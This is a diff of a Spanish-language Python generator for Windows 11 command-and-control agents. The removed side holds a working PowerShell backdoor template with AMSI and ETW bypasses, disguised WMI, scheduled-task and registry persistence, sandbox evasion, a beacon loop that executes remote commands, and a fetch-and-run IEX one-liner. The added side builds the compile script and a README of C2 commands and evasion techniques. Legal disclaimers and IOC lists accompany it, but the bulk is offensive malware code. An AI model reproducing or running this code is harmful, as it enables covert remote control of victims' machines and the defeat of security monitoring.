+    echo.
+    
+    echo [!] ADVERTENCIA LEGAL:
+    echo     Este software es para investigación autorizada únicamente.
+    echo     El uso no autorizado es ilegal y puede resultar en:
+    echo     • Procesamiento penal
+    echo     • Sanciones civiles
+    echo     • Daño a la reputación
+    echo.
+    
+    REM Mostrar hash del ejecutable
+    echo [*] Verificación de integridad:
+    certutil -hashfile {output_file} SHA256
+    
 ) else (
-    echo [!] Error en la compilación
+    echo.
+    echo ╔══════════════════════════════════════════════════════════════════╗
+    echo ║                    ERROR EN LA COMPILACIÓN                       ║
+    echo ╚══════════════════════════════════════════════════════════════════╝
+    echo.
+    
+    echo [!] Posibles soluciones:
+    echo     1. Verificar que .NET Framework 4.8+ esté instalado
+    echo     2. Instalar Microsoft Build Tools
+    echo     3. Verificar sintaxis del archivo .cs
+    echo     4. Asegurar permisos de escritura
+    echo.
 )
 
+echo.
 pause
 '''
         
-        with open('compile_enhanced.bat', 'w', encoding='utf-8') as f:
-            f.write(build_script)
+        script_file = "compile_agent.bat"
+        with open(script_file, 'w', encoding='utf-8') as f:
+            f.write(script)
         
-        print(f"[+] Script de compilación generado: compile_enhanced.bat")
+        print(f"[+] Script de compilación generado: {script_file}")
+    
+    def _generate_readme(self, c2_server, c2_port, output_file, features):
+        """Generar archivo README con instrucciones"""
+        
+        features_list = "\n".join([f"- {self.features[feat]}" for feat in features])
+        
+        readme = f'''NEXUS AGENT GENERATOR - WINDOWS 11
+============================================
+
+FECHA DE GENERACIÓN: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+VERSIÓN: {self.version}
+AUTOR: {self.author}
+
+CONFIGURACIÓN
+-------------
+• Servidor C2: {c2_server}
+• Puerto C2: {c2_port}
+• Archivo de salida: {output_file}
+
+CARACTERÍSTICAS INCLUIDAS
+-------------------------
+{features_list}
+
+COMPILACIÓN
+-----------
+1. Copiar los siguientes archivos a Windows 11:
+   - agent.cs (código fuente)
+   - compile_agent.bat (script de compilación)
+
+2. Ejecutar como administrador:
+   > compile_agent.bat
+
+3. Si hay errores, verificar:
+   • .NET Framework 4.8+ instalado
+   • Permisos de administrador
+   • Espacio en disco suficiente
+
+EJECUCIÓN
+---------
+MODO NORMAL:
+  {output_file}
+
+CON PERSISTENCIA:
+  {output_file} --install
+
+COMANDOS C2 DISPONIBLES
+-----------------------
+• shell <command>    - Ejecutar comando en el sistema
+• download <file>    - Descargar archivo desde el objetivo
+• persistence        - Instalar métodos de persistencia
+• exit              - Terminar agente
+
+TÉCNICAS DE EVASIÓN IMPLEMENTADAS
+---------------------------------
+1. AMSI Bypass:
+   - Memory patching de AmsiScanBuffer
+   - Reflection para deshabilitar AMSI
+
+2. ETW Bypass:
+   - NtSetInformationProcess
+   - Patch de EtwEventWrite
+
+3. Persistencia:
+   - Registry Run keys
+   - Scheduled Tasks
+   - Startup folder
+   - WMI Event Subscriptions (admin)
+
+4. Anti-Detección:
+   - Anti-debugging (IsDebuggerPresent, timing checks)
+   - Anti-VM/Sandbox (procesos, RAM, registry)
+   - Ofuscación de strings y datos
+
+DETECCIÓN DEFENSIVA (Blue Team)
+--------------------------------
+Indicadores de Compromiso (IOCs):
+
+1. Network:
+   - Conexiones a {c2_server}:{c2_port}
+   - Beaconing cada 30 segundos
+   - Tráfico JSON con campos específicos
+
+2. System:
+   - Registry keys con nombres aleatorios
+   - Scheduled tasks con nombres de Microsoft
+   - Proceso sin ventana visible
+   - AMSI/ETW deshabilitados
+
+3. Process:
+   - Nombre aleatorio del ejecutable
+   - Comunicación TCP en segundo plano
+   - Threads separados para beaconing
+
+MITIGACIONES RECOMENDADAS
+-------------------------
+1. Network Security:
+   - SSL/TLS inspection
+   - IDS/IPS con firmas de C2
+   - Egress filtering
+   - Network segmentation
+
+2. Endpoint Protection:
+   - EDR con behavioral analysis
+   - AMSI habilitado y monitoreado
+   - PowerShell logging completo
+   - Application whitelisting
+
+3. Monitoring:
+   - Sysmon con configuración avanzada
+   - Windows Event Log centralizado
+   - Monitorización de Scheduled Tasks
+   - Detección de procesos sin ventana
+
+LEGALIDAD Y ÉTICA
+-----------------
+ESTE SOFTWARE ES EXCLUSIVAMENTE PARA:
+• Investigación de seguridad autorizada
+• Pruebas de penetración con permiso escrito
+• Laboratorios CTF controlados
+• Auditorías de seguridad
+
+USO NO AUTORIZADO ES ILEGAL Y PUEDE RESULTAR EN:
+• Procesamiento penal según leyes locales
+• Sanciones civiles y multas
+• Pérdida de certificaciones profesionales
+• Daño irreparable a la reputación
+
+CONTACTO
+--------
+Para preguntas sobre investigación de seguridad:
+research@security-lab.edu
+
+¡USO RESPONSABLE Y ÉTICO!
+'''
+        
+        readme_file = "README_AGENT.txt"
+        with open(readme_file, 'w', encoding='utf-8') as f:
+            f.write(readme)
+        
+        print(f"[+] Documentación generada: {readme_file}")
     
     def _generate_session_id(self):
         """Generar ID de sesión único"""
         chars = string.ascii_lowercase + string.digits
         return ''.join(random.choice(chars) for _ in range(16))
     
-    def generate_powershell_enhanced(self, c2_server, c2_port, output_file="agent_enhanced.ps1"):
-        """Generar PowerShell mejorado con bypass"""
-        
-        session_id = self._generate_session_id()
-        
-        powershell_code = f'''# PowerShell Agent Enhanced - Windows 11 Bypass
-# Autor: Security Research
-# Uso: Solo para pruebas autorizadas
-
-# ============================================================================
-# CONFIGURACIÓN
-# ============================================================================
-$C2_SERVER = "{c2_server}"
-$C2_PORT = {c2_port}
-$SESSION_ID = "{session_id}"
-$BEACON_INTERVAL = 45
-
-# ============================================================================
-# BYPASS AMSI (Múltiples métodos)
-# ============================================================================
-
-function Bypass-AMSI-Comprehensive {{
-    # Método 1: Memory patch (si tenemos permisos)
-    try {{
-        $Win32 = Add-Type -MemberDefinition @"
-[DllImport("kernel32")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibrary(string name);
-[DllImport("kernel32")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-"@ -Name "Win32" -Namespace Win32Functions -PassThru
-        
-        $amsiDll = $Win32::LoadLibrary("amsi.dll")
-        $asbAddr = $Win32::GetProcAddress($amsiDll, "AmsiScanBuffer")
-        
-        if ($asbAddr -ne [IntPtr]::Zero) {{
-            Write-Host "[+] AMSI patch address: $asbAddr" -ForegroundColor Green
-        }}
-    }} catch {{}}
-
-    # Método 2: Reflection
-    try {{
-        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        if ($Ref) {{
-            $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-            Write-Host "[+] AMSI disabled via reflection" -ForegroundColor Green
-        }}
-    }} catch {{}}
-
-    # Método 3: Forzar error de contexto
-    try {{
-        [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',('NonPublic,Static')) -as [Reflection.FieldInfo]).SetValue($null,$true)
-    }} catch {{}}
-}}
-
-# ============================================================================
-# BYPASS ETW
-# ============================================================================
-
-function Bypass-ETW {{
-    try {{
-        # Método 1: Patch via .NET Reflection
-        $etwProvider = [System.Diagnostics.Eventing.EventProvider].GetField("m_provider", "NonPublic,Instance")
-        if ($etwProvider) {{
-            # Intentar deshabilitar
-        }}
-        
-        # Método 2: Usar scripts nativos
-        $script = @'
-using System;
-using System.Runtime.InteropServices;
-public class EtwBypass {{
-    [DllImport("ntdll.dll")]
-    public static extern uint NtSetInformationProcess(IntPtr hProcess, uint processInformationClass, ref uint processInformation, uint processInformationLength);
+    def _generate_agent_id(self):
+        """Generar ID de agente único"""
+        return f"AGENT_{random.randint(10000, 99999)}_{int(datetime.now().timestamp())}"
     
-    public static void Disable() {{
-        uint flag = 0x1F;
-        uint disable = 1;
-        NtSetInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, flag, ref disable, 4);
-    }}
-}}
-'@
+    def _generate_random_var_name(self, length=12, prefix=""):
+        """Generar nombre de variable aleatorio"""
+        if prefix:
+            base = prefix + "_"
+        else:
+            base = ""
         
-        Add-Type -TypeDefinition $script -Language CSharp
-        [EtwBypass]::Disable()
-        Write-Host "[+] ETW bypass applied" -ForegroundColor Green
-    }} catch {{}}
-}}
+        chars = string.ascii_letters
+        random_part = ''.join(random.choice(chars) for _ in range(length))
+        
+        return base + random_part
+    
+    def display_banner(self):
+        """Mostrar banner del generador"""
+        
+        banner = f'''
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║    ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗  ██████╗ ████████╗   ║
+║    ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██╔═══██╗╚══██╔══╝   ║
+║    ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ██║      ║
+║    ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██║      ║
+║    ██║██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝   ██║      ║
+║    ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝      ║
+║                                                                              ║
+║                   WINDOWS 11 AGENT GENERATOR v{self.version}                  ║
+║                    For Authorized Security Research Only                     ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
 
-# ============================================================================
-# PERSISTENCIA AVANZADA
-# ============================================================================
-
-function Install-Persistence-Advanced {{
-    param(
-        [string]$PayloadPath = $MyInvocation.MyCommand.Path
-    )
+⚠️  LEGAL DISCLAIMER: This tool is EXCLUSIVELY for authorized security research,
+    penetration testing with written permission, and controlled CTF environments.
+    NEVER use on systems without explicit authorization.
     
-    # Método 1: WMI Event Subscription
-    try {{
-        $filterName = "WindowsUpdateMonitor_" + (Get-Random -Minimum 1000 -Maximum 9999)
-        $consumerName = "WindowsUpdateService_" + (Get-Random -Minimum 1000 -Maximum 9999)
-        
-        $filterArgs = @{{
-            Name = $filterName
-            EventNamespace = 'root\cimv2'
-            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-        }}
-        
-        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
-        
-        $consumerArgs = @{{
-            Name = $consumerName
-            CommandLineTemplate = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '$PayloadPath'"
-        }}
-        
-        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
-        
-        $bindingArgs = @{{
-            Filter = $filter
-            Consumer = $consumer
-        }}
-        
-        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
-        
-        Write-Host "[+] WMI persistence installed: $filterName" -ForegroundColor Green
-    }} catch {{ Write-Host "[-] WMI persistence failed" -ForegroundColor Red }}
-    
-    # Método 2: Scheduled Task
-    try {{
-        $taskName = "MicrosoftEdgeUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File '$PayloadPath'"
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
-        
-        Write-Host "[+] Scheduled Task installed: $taskName" -ForegroundColor Green
-    }} catch {{ Write-Host "[-] Scheduled Task failed" -ForegroundColor Red }}
-    
-    # Método 3: Registry
-    try {{
-        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        $valueName = "OneDriveSync_" + (Get-Random -Minimum 1000 -Maximum 9999)
-        $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '$PayloadPath'"
-        
-        New-ItemProperty -Path $regPath -Name $valueName -Value $regValue -PropertyType String -Force
-        
-        Write-Host "[+] Registry persistence installed" -ForegroundColor Green
-    }} catch {{ Write-Host "[-] Registry persistence failed" -ForegroundColor Red }}
-}}
-
-# ============================================================================
-# OFUSCACIÓN Y EVASIÓN
-# ============================================================================
-
-function Invoke-ObfuscatedCommand {{
-    param([string]$Command)
-    
-    # Dividir y ofuscar comando
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
-    $base64 = [Convert]::ToBase64String($bytes)
-    
-    # Crear comando ofuscado
-    $chunks = @()
-    for ($i = 0; $i -lt $base64.Length; $i += 4) {{
-        $chunk = $base64.Substring($i, [Math]::Min(4, $base64.Length - $i))
-        $chunks += "`"$chunk`""
-    }}
-    
-    $chunkString = $chunks -join ","
-    $obfuscated = "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($chunkString -join ''))) | IEX"
-    
-    return $obfuscated
-}}
-
-function Test-Evasion {{
-    # Verificar si estamos en sandbox
-    $isSandbox = $false
-    
-    # Check 1: Tiempo de ejecución del sistema
-    $uptime = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
-    $uptimeHours = ((Get-Date) - $uptime).TotalHours
-    if ($uptimeHours -lt 2) {{ $isSandbox = $true }}
-    
-    # Check 2: Memoria RAM
-    $ram = (Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB
-    if ($ram -lt 2) {{ $isSandbox = $true }}
-    
-    # Check 3: CPU cores
-    $cores = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
-    if ($cores -lt 2) {{ $isSandbox = $true }}
-    
-    return $isSandbox
-}}
-
-# ============================================================================
-# COMUNICACIÓN C2
-# ============================================================================
-
-function Connect-C2 {{
-    param([string]$Data)
-    
-    try {{
-        $tcpClient = New-Object System.Net.Sockets.TcpClient
-        $tcpClient.Connect($C2_SERVER, $C2_PORT)
-        $stream = $tcpClient.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $reader = New-Object System.IO.StreamReader($stream)
-        
-        $writer.WriteLine($Data)
-        $writer.Flush()
-        
-        $response = $reader.ReadLine()
-        
-        $reader.Close()
-        $writer.Close()
-        $tcpClient.Close()
-        
-        return $response
-    }} catch {{
-        return $null
-    }}
-}}
-
-function Send-Handshake {{
-    $hostname = $env:COMPUTERNAME
-    $username = $env:USERNAME
-    $os = (Get-CimInstance Win32_OperatingSystem).Caption
-    $arch = if ([Environment]::Is64BitOperatingSystem) {{ "x64" }} else {{ "x86" }}
-    
-    $handshake = @{{
-        type = "agent_handshake"
-        session_id = $SESSION_ID
-        hostname = $hostname
-        username = $username
-        os = $os
-        arch = $arch
-        pid = $PID
-        bypass_status = @{{
-            amsi = $true
-            etw = $true
-            persistence = $true
-        }}
-        capabilities = @("shell", "file_transfer", "persistence_install")
-    }} | ConvertTo-Json -Compress
-    
-    Connect-C2 -Data $handshake | Out-Null
-}}
-
-# ============================================================================
-# MAIN EXECUTION
-# ============================================================================
-
-# Aplicar bypasses
-Write-Host "[*] Applying Windows 11 bypasses..." -ForegroundColor Yellow
-Bypass-AMSI-Comprehensive
-Bypass-ETW
-
-# Verificar sandbox
-if (Test-Evasion) {{
-    Write-Host "[!] Sandbox detected, exiting..." -ForegroundColor Red
-    exit
-}}
-
-# Instalar persistencia (opcional)
-if ($args -contains "--install") {{
-    Install-Persistence-Advanced
-}}
-
-# Handshake inicial
-Send-Handshake
-
-# Loop principal
-while ($true) {{
-    try {{
-        # Heartbeat
-        $heartbeat = @{{type = "heartbeat"; session_id = $SESSION_ID}} | ConvertTo-Json -Compress
-        $response = Connect-C2 -Data $heartbeat
-        
-        if ($response) {{
-            $command = $response | ConvertFrom-Json
-            
-            if ($command.type -eq "execute_command") {{
-                # Ejecutar comando ofuscado
-                $obfuscatedCmd = Invoke-ObfuscatedCommand -Command $command.command
-                $result = Invoke-Expression $obfuscatedCmd 2>&1 | Out-String
-                
-                $responseData = @{{
-                    type = "command_result"
-                    command_id = $command.command_id
-                    result = $result
-                    success = $?
-                }} | ConvertTo-Json -Compress
-                
-                Connect-C2 -Data $responseData | Out-Null
-            }}
-            elseif ($command.type -eq "install_persistence") {{
-                Install-Persistence-Advanced
-                $responseData = @{{type = "result"; message = "Persistence installed"}} | ConvertTo-Json -Compress
-                Connect-C2 -Data $responseData | Out-Null
-            }}
-        }}
-    }} catch {{
-        # Error silencioso
-    }}
-    
-    Start-Sleep -Seconds $BEACON_INTERVAL
-}}
 '''
-        
-        with open(output_file, 'w', encoding='utf-8') as f:
-            f.write(powershell_code)
-        
-        print(f"[+] PowerShell mejorado generado: {output_file}")
-        
-        # Mostrar instrucciones
-        self._show_powershell_instructions(output_file, c2_port)
-        
-        return output_file
-    
-    def _show_powershell_instructions(self, filename, c2_port):
-        """Mostrar instrucciones para PowerShell"""
-        
-        instructions = f'''
-📋 INSTRUCCIONES PARA POWERSHELL MEJORADO:
-
-1. EJECUCIÓN BÁSICA (bypass automático):
-   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File {filename}
-
-2. CON PERSISTENCIA:
-   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File {filename} --install
-
-3. COMO ONELINER (sin archivo):
-   IEX(New-Object Net.WebClient).DownloadString('http://your-server/{filename}')
-
-4. MÉTODOS DE BYPASS INCLUIDOS:
-   • AMSI Bypass (3 métodos diferentes)
-   • ETW Bypass (Event Tracing for Windows)
-   • Persistencia avanzada (WMI, Scheduled Tasks, Registry)
-   • Detección de sandbox
-   • Ofuscación de comandos
-
-5. COMANDOS C2 DISPONIBLES:
-   • execute_command <cmd>     - Ejecutar comando ofuscado
-   • install_persistence       - Instalar persistencia
-   • heartbeat                 - Enviar latido
-
-6. PARA DETECCIÓN BLUE TEAM:
-   • Monitorear WMI Event Subscriptions
-   • Verificar Scheduled Tasks con nombres aleatorios
-   • Buscar procesos PowerShell con argumentos ofuscados
-   • Monitorizar conexiones al puerto {c2_port}
-
-⚠️  SOLO PARA ENTORNOS AUTORIZADOS
-'''
-        
-        print(instructions)
-    
-    def generate_all_agents(self, c2_server, c2_port, output_dir="agents_enhanced"):
-        """Generar todos los tipos de agentes mejorados"""
-        
-        os.makedirs(output_dir, exist_ok=True)
-        
-        print(f"[+] Generando agentes mejorados en: {output_dir}")
-        
-        # 1. Agente C# mejorado
-        cs_file = os.path.join(output_dir, "agent_enhanced.cs")
-        self.generate_enhanced_csharp(c2_server, c2_port, cs_file)
-        
-        # 2. PowerShell mejorado
-        ps_file = os.path.join(output_dir, "agent_enhanced.ps1")
-        self.generate_powershell_enhanced(c2_server, c2_port, ps_file)
-        
-        # 3. Generar README
-        self._generate_readme(c2_server, c2_port, output_dir)
-        
-        print(f"\n[+] Todos los agentes generados en: {output_dir}")
-        print(f"    • agent_enhanced.cs   - Agente C# con bypass completo")
-        print(f"    • agent_enhanced.ps1  - PowerShell mejorado")
-        print(f"    • compile_enhanced.bat - Script de compilación")
-        print(f"    • README.txt          - Instrucciones completas")
-    
-    def _generate_readme(self, c2_server, c2_port, output_dir):
-        """Generar archivo README"""
-        
-        readme = f'''NEXUS C2 - AGENTES MEJORADOS WINDOWS 11
-============================================
-
-ESTE SOFTWARE ES EXCLUSIVAMENTE PARA:
-• Investigación de seguridad autorizada
-• Pruebas de penetración con permiso
-• Laboratorios CTF controlados
-• Auditorías de seguridad
-
-⚠️ NUNCA USAR EN SISTEMAS NO AUTORIZADOS
-
-CONFIGURACIÓN
--------------
-Servidor C2: {c2_server}
-Puerto C2: {c2_port}
-
-AGENTES GENERADOS
------------------
-
-1. agent_enhanced.cs
-   - Lenguaje: C#
-   - Características:
-     • AMSI Bypass (Windows 11 compatible)
-     • ETW Bypass completo
-     • Persistencia avanzada (WMI, Scheduled Tasks)
-     • Ofuscación real-time
-     • SmartScreen bypass
-     • Anti-debugging mejorado
-   
-   Compilación:
-     compile_enhanced.bat
-   
-   Uso:
-     agent_enhanced.exe          - Ejecutar agente
-     agent_enhanced.exe --install - Instalar persistencia
-
-2. agent_enhanced.ps1
-   - Lenguaje: PowerShell
-   - Características:
-     • AMSI Bypass (3 métodos)
-     • ETW Bypass
-     • Persistencia múltiple
-     • Detección de sandbox
-     • Ofuscación de comandos
-   
-   Uso:
-     powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File agent_enhanced.ps1
-     powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File agent_enhanced.ps1 --install
-
-TÉCNICAS DE BYPASS IMPLEMENTADAS
---------------------------------
-
-1. AMSI BYPASS:
-   • Patch de memoria AmsiScanBuffer
-   • Reflection para deshabilitar AMSI
-   • Context manipulation
-
-2. ETW BYPASS:
-   • NtSetInformationProcess
-   • Patch EtwEventWrite
-   • Deshabilitar providers .NET
-
-3. PERSISTENCIA:
-   • WMI Event Subscriptions
-   • Scheduled Tasks disfrazados
-   • Registry Run keys
-   • Startup folder
-
-4. EVASIÓN:
-   • Ofuscación real-time
-   • Detección de sandbox
-   • Anti-debugging
-   • Cambio de nombres
-
-DETECCIÓN DEFENSIVA (Blue Team)
---------------------------------
-
-Indicadores de Compromiso (IOCs):
-
-1. Red:
-   • Conexiones a {c2_server}:{c2_port}
-   • Beaconing cada 45 segundos
-   • Tráfico JSON con campos específicos
-
-2. Sistema:
-   • WMI Event Filters con nombres aleatorios
-   • Scheduled Tasks con nombres de Microsoft
-   • Procesos con argumentos ofuscados
-   • Modificación de checksum PE
-
-3. PowerShell:
-   • Scripts con funciones de bypass
-   • Comandos ofuscados en base64
-   • Deshabilitación de AMSI/ETW
-
-MITIGACIONES RECOMENDADAS
---------------------------
-
-1. Endpoint:
-   • Habilitar AMSI y asegurar funcionamiento
-   • Usar EDR con behavioral analysis
-   • Monitorizar WMI y Scheduled Tasks
-   • PowerShell logging completo
-
-2. Network:
-   • Inspección SSL/TLS
-   • IDS/IPS con firmas C2
-   • Monitoreo de beaconing
-   • Filtrado egress
-
-3. Logging:
-   • Sysmon con configuración completa
-   • Windows Event Log centralizado
-   • PowerShell transcription
-
-LEGALIDAD
----------
-
-Este software debe usarse SOLO en:
-• Sistemas propios con permiso
-• Laboratorios de pruebas controlados
-• Ejercicios de capacitación autorizados
-• Auditorías de seguridad contratadas
-
-El uso no autorizado es ILEGAL y puede resultar en:
-• Procesamiento penal
-• Sanciones civiles
-• Pérdida de certificaciones
-• Daño a la reputación
-
-CONTACTO Y SOPORTE
--------------------
-
-Este es software de investigación.
-No hay soporte para uso malicioso.
-
-Para preguntas de investigación:
-research@security-lab.edu
-
-Última actualización: {datetime.now().strftime('%Y-%m-%d')}
-'''
-        
-        readme_file = os.path.join(output_dir, "README.txt")
-        with open(readme_file, 'w', encoding='utf-8') as f:
-            f.write(readme)
-        
-        print(f"[+] README generado: {readme_file}")
+        print(banner)
 
 def main():
-    """Función principal mejorada"""
+    """Función principal"""
     
-    print("""
-╔══════════════════════════════════════════════════════════════════╗
-║      GENERADOR DE AGENTES WINDOWS 11 - BYPASS COMPLETO          ║
-║            AMSI + ETW + PERSISTENCIA + OFUSCACIÓN               ║
-╚══════════════════════════════════════════════════════════════════╝
-
-⚠️  EXCLUSIVO PARA INVESTIGACIÓN AUTORIZADA Y LABORATORIOS CTF
-    """)
+    parser = argparse.ArgumentParser(
+        description='Generador de agentes Windows 11 con técnicas de evasión avanzadas',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Ejemplos de uso:
+  %(prog)s --c2-server 192.168.1.100 --c2-port 8443
+  %(prog)s --c2-server example.com --c2-port 443 --features amsi etw persistence
+  %(prog)s --c2-server 10.0.0.5 --c2-port 8080 --output backdoor.exe --mode debug
+  
+Características disponibles:
+  amsi        - AMSI bypass completo
+  etw         - ETW bypass
+  persistence - Persistencia avanzada
+  obfuscation - Ofuscación real-time
+  antidebug   - Anti-debugging techniques
+  antivm      - Anti-VM/Sandbox detection
+  smart_screen- SmartScreen bypass
+  polymorphic - Comunicación polimórfica
+        '''
+    )
     
-    parser = argparse.ArgumentParser(description='Generador de agentes Windows 11 con bypass completo')
-    parser.add_argument('--c2-server', required=True, help='IP del servidor C2')
-    parser.add_argument('--c2-port', type=int, default=8443, help='Puerto del C2')
-    parser.add_argument('--type', choices=['csharp', 'powershell', 'all'], 
-                       default='all', help='Tipo de agente')
-    parser.add_argument('--output', help='Nombre del archivo de salida')
-    parser.add_argument('--features', nargs='+', 
-                       default=['amsi', 'etw', 'persistence', 'obfuscation'],
-                       help='Características a incluir (amsi, etw, persistence, obfuscation, smartscreen)')
+    parser.add_argument('--c2-server', required=True,
+                       help='IP o dominio del servidor C2')
+    parser.add_argument('--c2-port', type=int, default=8443,
+                       help='Puerto del servidor C2 (default: 8443)')
+    parser.add_argument('--output', default='agent.exe',
+                       help='Nombre del archivo de salida (default: agent.exe)')
+    parser.add_argument('--features', nargs='+',
+                       default=['amsi', 'etw', 'persistence', 'antidebug'],
+                       help='Características a incluir en el agente')
+    parser.add_argument('--mode', choices=['debug', 'release'], default='release',
+                       help='Modo de compilación (default: release)')
     
     args = parser.parse_args()
     
-    generator = SilentWindowsAgentEnhanced()
+    # Validar puerto
+    if not (1 <= args.c2_port <= 65535):
+        print("[-] Puerto inválido. Debe estar entre 1 y 65535")
+        return
     
-    if args.type == 'csharp':
-        if not args.output:
-            args.output = "agent_enhanced.exe"
+    # Inicializar generador
+    generator = WindowsAgentGenerator()
+    generator.display_banner()
+    
+    # Generar agente
+    try:
+        cs_file = generator.generate_agent(
+            c2_server=args.c2_server,
+            c2_port=args.c2_port,
+            output_file=args.output,
+            features=args.features,
+            compilation_mode=args.mode
+        )
         
-        generator.generate_enhanced_csharp(
-            args.c2_server, 
-            args.c2_port, 
-            args.output,
-            args.features
-        )
-    
-    elif args.type == 'powershell':
-        if not args.output:
-            args.output = "agent_enhanced.ps1"
-        
-        generator.generate_powershell_enhanced(
-            args.c2_server, 
-            args.c2_port, 
-            args.output
-        )
-    
-    elif args.type == 'all':
-        generator.generate_all_agents(
-            args.c2_server, 
-            args.c2_port
-        )
-    
-    print(f"\n✅ Generación completada")
-    print(f"   Servidor C2: {args.c2_server}:{args.c2_port}")
-    print(f"   Recordatorio: USO ÉTICO Y AUTORIZADO ÚNICAMENTE")
+        if cs_file:
+            print(f"\n{'='*80}")
+            print("✅ GENERACIÓN COMPLETADA EXITOSAMENTE")
+            print('='*80)
+            print(f"\nArchivos generados:")
+            print(f"  1. {cs_file}          - Código fuente C#")
+            print(f"  2. compile_agent.bat  - Script de compilación para Windows")
+            print(f"  3. README_AGENT.txt   - Documentación completa")
+            
+            print(f"\n📋 INSTRUCCIONES PARA COMPILAR EN WINDOWS 11:")
+            print(f"  1. Copia los archivos a Windows 11")
+            print(f"  2. Ejecuta como administrador: compile_agent.bat")
+            print(f"  3. El ejecutable {args.output} será generado")
+            
+            print(f"\n⚠️  RECORDATORIO LEGAL:")
+            print(f"  Este software es EXCLUSIVAMENTE para investigación autorizada.")
+            print(f"  El uso no autorizado es ILEGAL y tiene consecuencias severas.")
+            print(f"\n{'='*80}")
+            
+    except Exception as e:
+        print(f"\n[!] Error durante la generación: {e}")
+        print("    Verifica los parámetros e intenta nuevamente.")
 
 if __name__ == "__main__":
     main()
